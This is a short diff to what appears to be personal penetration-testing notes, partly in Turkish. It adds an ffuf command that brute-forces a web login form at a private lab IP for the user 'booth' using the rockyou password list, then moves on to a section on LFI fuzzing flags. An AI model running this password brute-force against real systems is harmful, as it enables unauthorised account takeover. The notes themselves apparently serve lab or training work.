@@ -1,4 +1,9 @@
-.LFI Fuzzing;
+## passsword fuzz
+```bash
+ffuf -w /usr/share/wordlists/rockyou.txt  -d "username=booth&password=FUZZ" -u http://10.113.152.207/login  -H "Content-Type: application/x-www-form-urlencoded" -fs 3567
+```
+
+##  LFI Fuzzing;
 ```
 -ic: Büyük/küçük harf duyarsız (ignore case).
 -c: Renkli çıktı (color).
